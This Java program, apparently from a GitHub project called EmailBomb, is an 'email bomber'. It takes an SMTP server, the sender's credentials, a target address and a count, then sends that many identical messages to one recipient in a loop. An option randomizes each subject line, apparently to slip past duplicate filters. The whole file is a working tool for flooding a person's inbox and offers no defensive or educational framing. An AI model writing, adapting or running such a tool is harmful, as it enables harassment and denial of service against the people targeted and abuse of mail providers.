package top.snowolives;
import javax.mail.*;
import javax.mail.internet.*;
import java.util.Properties;
import java.util.Scanner;
import java.util.Random;
public class Main {
    public static void main(String[] args) throws Exception {
        Scanner input = new Scanner(System.in);
        Random random = new Random();
        System.out.println("EmailBombV1 -.-.-.-.-");
        System.out.println("Version 1.2");
        System.out.println("Made by Christina(YukitaRiko)");
        System.out.println("Github Package: https://github.com/Orangecat847/EmailBomb");
        System.out.print("Please enter a SMTP Server: ");
        String smtp_server = input.nextLine();
        System.out.print("Please enter your Email: ");
        String sender = input.nextLine();
        System.out.print("Please enter your password: ");
        String password = input.nextLine();
        System.out.print("Please enter the receiver: ");
        String receiver = input.nextLine();
        System.out.print("What's the subject? ");
        String subject = input.nextLine();
        String rsn = "";
        if (subject.equals("/random")) {
            rsn = subject;
        }
        System.out.print("What's the text? ");
        String text = input.nextLine();
        System.out.print("How many Emails Do you want to send: ");
        int num = input.nextInt();
        Properties properties = new Properties();
        properties.put("mail.smtp.host", smtp_server);
        properties.put("mail.smtp.port", "587");
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        Session session = Session.getInstance(properties, new Authenticator() {
            @Override
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(sender, password);
            }
        });
        session.setDebug(true);
        while (num > 0) {
                if (rsn.equals("/random")) {
                    int rn = random.nextInt(1000000);
                    String rns = Integer.toString(rn);
                    subject = rns;
                    Message message = new MimeMessage(session);
                    message.setFrom(new InternetAddress(sender));
                    message.setRecipient(Message.RecipientType.TO, new InternetAddress(receiver));
                    message.setSubject(subject);
                    message.setText(text);
                    Transport.send(message);
                    num -= 1;
                }
                else{
                    Message message = new MimeMessage(session);
                    message.setFrom(new InternetAddress(sender));
                    message.setRecipient(Message.RecipientType.TO, new InternetAddress(receiver));
                    message.setSubject(subject);
                    message.setText(text);
                    Transport.send(message);
                    num -= 1;
                }
            }
        }
}
